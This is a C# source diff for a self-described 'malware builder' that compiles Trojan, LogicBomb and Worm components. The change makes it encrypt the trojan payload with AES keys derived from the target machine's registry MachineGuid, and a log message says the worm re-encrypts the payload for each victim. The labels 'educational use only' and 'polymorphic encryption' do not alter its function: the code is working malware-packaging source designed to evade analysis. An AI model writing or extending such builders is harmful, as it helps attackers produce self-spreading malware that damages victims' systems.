@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using Microsoft.Win32;
 
 namespace Builder
 {
@@ -13,13 +14,13 @@ namespace Builder
         private static string BuilderOutputDir;
         private static string PayloadDir;
 
-        private static byte[] AesKey;
-        private static byte[] AesIV;
+        private static string MachineGuid;
 
         static void Main(string[] args)
         {
             Console.WriteLine("===========================================");
             Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
+            Console.WriteLine("   Polymorphic Encryption Edition");
             Console.WriteLine("===========================================");
             Console.WriteLine();
 
@@ -28,28 +29,25 @@ namespace Builder
                 // Initialize paths
                 InitializePaths();
 
-                // Step 1: Generate AES key and IV
-                GenerateEncryptionKeys();
+                // Step 1: Get Machine GUID and derive keys
+                GetMachineGuidAndDeriveKeys();
 
                 // Step 2: Build Trojan
                 BuildProject("Trojan");
 
-                // Step 3: Encrypt Trojan.exe
+                // Step 3: Encrypt Trojan.exe with machine-specific key
                 EncryptTrojan();
 
-                // Step 4: Update LogicBomb template with encryption keys
-                UpdateLogicBombTemplate();
-
-                // Step 5: Build LogicBomb
+                // Step 4: Build LogicBomb (with key derivation logic, no static keys)
                 BuildProject("LogicBomb");
 
-                // Step 6: Build Worm
+                // Step 5: Build Worm
                 BuildProject("Worm");
 
-                // Step 7: Create output structure
+                // Step 6: Create output structure
                 CreateOutputStructure();
 
-                // Step 8: Cleanup
+                // Step 7: Cleanup
                 CleanupIntermediateFiles();
 
                 Console.WriteLine();
@@ -62,6 +60,9 @@ namespace Builder
                 LogInfo($"    - payload/");
                 LogInfo($"        - LogicBomb.exe");
                 LogInfo($"        - bomb.encrypted");
+                Console.WriteLine();
+                LogWarning("Note: bomb.encrypted is encrypted with THIS machine's GUID.");
+                LogWarning("Worm will re-encrypt for each victim with their specific GUID.");
             }
             catch (Exception ex)
             {
@@ -100,22 +101,17 @@ namespace Builder
             Console.WriteLine();
         }
 
-        private static void GenerateEncryptionKeys()
+        private static void GetMachineGuidAndDeriveKeys()
         {
-            LogInfo("Generating AES-256 encryption key and IV...");
+            LogInfo("Retrieving Machine GUID for polymorphic encryption...");
 
-            using (Aes aes = Aes.Create())
-            {
-                aes.KeySize = 256;
-                aes.GenerateKey();
-                aes.GenerateIV();
+            MachineGuid = CryptoUtils.GetMachineGuid();
 
-                AesKey = aes.Key;
-                AesIV = aes.IV;
-            }
+            LogSuccess($"Machine GUID: {MachineGuid}");
+            Console.WriteLine();
 
-            LogSuccess($"Generated AES Key: {BitConverter.ToString(AesKey).Replace("-", "")}");
-            LogSuccess($"Generated AES IV: {BitConverter.ToString(AesIV).Replace("-", "")}");
+            LogInfo("Deriving encryption keys from Machine GUID...");
+            CryptoUtils.LogDerivedKeys(MachineGuid);
             Console.WriteLine();
         }
 
@@ -130,7 +126,7 @@ namespace Builder
                 throw new FileNotFoundException($"Project file not found: {projectPath}");
             }
 
-            // Use MSBuild or dotnet build
+            // Use dotnet build
             ProcessStartInfo psi = new ProcessStartInfo
             {
                 FileName = "dotnet",
@@ -161,44 +157,16 @@ namespace Builder
 
         private static void EncryptTrojan()
         {
-            LogInfo("Encrypting Trojan.exe...");
+            LogInfo("Encrypting Trojan.exe with machine-specific key...");
 
-            string trojanExePath = Path.Combine(SolutionDir, "Trojan", "bin", "Debug", "Trojan.exe");
-
-            if (!File.Exists(trojanExePath))
-            {
-                // Try looking for .NET Core output
-                trojanExePath = Path.Combine(SolutionDir, "Trojan", "bin", "Debug", "net472", "Trojan.exe");
-                if (!File.Exists(trojanExePath))
-                {
-                    trojanExePath = Path.Combine(SolutionDir, "Trojan", "bin", "Debug", "net48", "Trojan.exe");
-                    if (!File.Exists(trojanExePath))
-                    {
-                        throw new FileNotFoundException($"Trojan.exe not found in expected build output locations");
-                    }
-                }
-            }
+            string trojanExePath = FindExecutable("Trojan", "Trojan.exe");
 
             LogInfo($"Found Trojan.exe at: {trojanExePath}");
 
-            // Create payload directory if it doesn't exist
-            Directory.CreateDirectory(PayloadDir);
-
             string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");
 
-            // Encrypt the file
-            using (Aes aes = Aes.Create())
-            {
-                aes.Key = AesKey;
-                aes.IV = AesIV;
-
-                using (FileStream fsInput = new FileStream(trojanExePath, FileMode.Open, FileAccess.Read))
-                using (FileStream fsOutput = new FileStream(encryptedOutputPath, FileMode.Create, FileAccess.Write))
-                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
-                {
-                    fsInput.CopyTo(cs);
-                }
-            }
+            // Encrypt using machine-specific key
+            CryptoUtils.EncryptFile(trojanExePath, encryptedOutputPath, MachineGuid);
 
             FileInfo originalFile = new FileInfo(trojanExePath);
             FileInfo encryptedFile = new FileInfo(encryptedOutputPath);
@@ -210,42 +178,9 @@ namespace Builder
             Console.WriteLine();
         }
 
-        private static void UpdateLogicBombTemplate()
-        {
-            LogInfo("Updating LogicBomb template with encryption keys...");
-
-            string templatePath = Path.Combine(SolutionDir, "LogicBomb", "ProgramTemplate.cs");
-            string programPath = Path.Combine(SolutionDir, "LogicBomb", "Program.cs");
-
-            if (!File.Exists(templatePath))
-            {
-                throw new FileNotFoundException($"Template file not found: {templatePath}");
-            }
-
-            // Read template
-            string templateContent = File.ReadAllText(templatePath);
-
-            // Generate byte array strings
-            string keyArrayString = string.Join(", ", AesKey.Select(b => $"0x{b:X2}"));
-            string ivArrayString = string.Join(", ", AesIV.Select(b => $"0x{b:X2}"));
-
-            // Replace placeholders
-            string updatedContent = templateContent.Replace("/*{{AES_KEY}}*/", keyArrayString);
-            updatedContent = updatedContent.Replace("/*{{AES_IV}}*/", ivArrayString);
-
-            // Write to Program.cs
-            File.WriteAllText(programPath, updatedContent);
-
-            LogSuccess("LogicBomb template updated successfully");
-            LogSuccess($"Embedded AES key and IV into: {programPath}");
-            Console.WriteLine();
-        }
-
         private static void CreateOutputStructure()
         {
             LogInfo("Creating output structure in 'product' folder...");
-
-            // Directories already created in InitializePaths()
 
             // Copy Worm.exe
             string wormSource = FindExecutable("Worm", "Worm.exe");
@@ -355,6 +290,98 @@ namespace Builder
             Console.Write("[ERROR] ");
             Console.ResetColor();
             Console.WriteLine(message);
+        }
+    }
+
+    // Embedded CryptoUtils class
+    public static class CryptoUtils
+    {
+        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
+        private const string IV_SALT = "_IV_SALT_2025";
+
+        public static string GetMachineGuid()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
+                {
+                    if (key != null)
+                    {
+                        object guidValue = key.GetValue("MachineGuid");
+                        if (guidValue != null)
+                        {
+                            string guid = guidValue.ToString();
+                            if (!string.IsNullOrEmpty(guid))
+                            {
+                                return guid;
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
+            }
+
+            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
+            return DEFAULT_MACHINE_ID;
+        }
+
+        public static byte[] DeriveKeyFromMachineId(string machineId)
+        {
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
+                byte[] hash = sha.ComputeHash(inputBytes);
+
+                byte[] key = new byte[32];
+                Array.Copy(hash, key, 32);
+
+                return key;
+            }
+        }
+
+        public static byte[] DeriveIVFromMachineId(string machineId)
+        {
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
+                byte[] hash = sha.ComputeHash(inputBytes);
+
+                byte[] iv = new byte[16];
+                Array.Copy(hash, iv, 16);
+
+                return iv;
+            }
+        }
+
+        public static void EncryptFile(string inputFile, string outputFile, string machineId)
+        {
+            byte[] key = DeriveKeyFromMachineId(machineId);
+            byte[] iv = DeriveIVFromMachineId(machineId);
+
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV = iv;
+
+                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
+                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    fsInput.CopyTo(cs);
+                }
+            }
+        }
+
+        public static void LogDerivedKeys(string machineId)
+        {
+            byte[] key = DeriveKeyFromMachineId(machineId);
+            byte[] iv = DeriveIVFromMachineId(machineId);
+
+            Console.WriteLine($"[CryptoUtils] Derived Key: {BitConverter.ToString(key).Replace("-", "").Substring(0, 32)}...");
+            Console.WriteLine($"[CryptoUtils] Derived IV:  {BitConverter.ToString(iv).Replace("-", "")}");
         }
     }
 }
